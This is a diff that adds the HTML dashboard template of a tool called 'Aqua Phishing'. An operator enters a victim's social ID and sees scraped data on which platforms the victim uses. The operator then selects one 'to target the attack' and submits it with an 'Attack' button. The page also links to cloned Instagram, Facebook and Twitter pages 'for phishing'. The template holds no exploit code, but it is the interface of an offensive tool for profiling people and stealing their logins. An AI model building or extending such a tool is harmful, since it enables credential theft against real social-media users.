@@ -1,0 +1,113 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="../../static/dashboardStyle.css">
+    <link rel="stylesheet" href="../../static/hoverEffect.css">
+
+
+    <style>
+        .backBtn {
+            border-radius: 25px;
+            margin: 5px 15px;
+            width: 60px;
+            padding: 5px;
+            height: fit-content;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            background: #ffc107 !important;
+        }
+    </style>
+</head>
+<!-- former dashboard.html -->
+
+<body>
+    <!-- display messages -->
+    {% for message in messages %}
+    <div class="alert alert-{{message.tags}} alert-dismissible fade show" role="alert">
+        <strong>Message:</strong>{{message}}
+    </div>
+    {% endfor %}
+
+
+    <div class="positionContainer">
+        <button class="backBtn"><a href="/dashboard">Back</a></button>
+
+        <div class="center">
+            <h1 class="project_name">Aqua Phishing</h1>
+            <h3 class="mode_name" style="color: rgb(0, 255, 217);  text-align: center;  font-size: large; font-style: italic;">Automatic Mode</h3>
+
+        </div>
+    </div>
+
+    {% if user.is_authenticated %}
+
+    <!-- Main module function:  Search feature -->
+    <div class="box">
+        <h1 style="margin-left: 2%;">Search</h1>
+        <form action="/automaticMode" method="post">
+            {% csrf_token %}
+            <input type="text" name="victim" placeholder="Enter the Victim's social ID">
+            <input type="submit" name="" value="Go">
+
+
+        </form>
+        {% if scrapedDataFreq != "" %}
+        <div class="dataContainer">
+            <div style="color: #fff !important;" class="scrapedData">
+                <h3 style="color: aqua;
+            background-color: #67594682;
+            border-radius: 10px;
+            padding: 5px;
+            ">As per scraped data, {{victim}} is active in following domains:</h3>
+
+                <h4>Select the domain to target the attack:</h4>
+                <br>
+                <form action="/automaticMode" method="post">
+                    {% csrf_token %}
+                    <label for="attackVector"></label> {% for data,value in scrapedDataFreq.items %}
+                    <input style="font-size: large;" class="attackInputForm" type="radio" name="attackVector" id="attackVector" value={{data}}><span>{{data}} : {{value}}%</span>
+                    <br> {% endfor %}
+                    <textarea name="result" id="result" cols="70" rows="6">{{result}}}</textarea>
+                    <input type="submit" style="margin: 10px; border-radius: 5px; background: #62f35d; margin-left: 225px;" value="Attack">
+                </form>
+
+            </div>
+        </div>
+        {% endif %}
+
+    </div>
+
+    <br>
+    <div class="clonedSites" style="margin-left: 8px;">
+        <h2 style="color: gold;">Cloned url for phishing:</h2>
+        <ul>
+            <li>
+                <a href="/cloned/instagram" target="_blank">Instagram</a>
+            </li>
+            <li>
+                <a href="/cloned/facebook" target="_blank">Facebook</a>
+            </li>
+            <li>
+                <a href="/cloned/twitter" target="_blank">Twitter</a>
+            </li>
+        </ul>
+    </div>
+    <button class="authBtn" style="margin-left: 12px;" type="submit" value=""><a href="/signout">Signout</a></button>
+
+
+    <!-- Below code is not reachable -->
+
+    <span></span> {% else %}
+    <button class="authBtn" type="submit" value=""><a href="/signup">Signup</a></button>
+    <button class="authBtn" type="submit" value=""><a href="/signin">Signin</a></button>{% endif %}
+
+
+
+
+</body>
+
+</html>
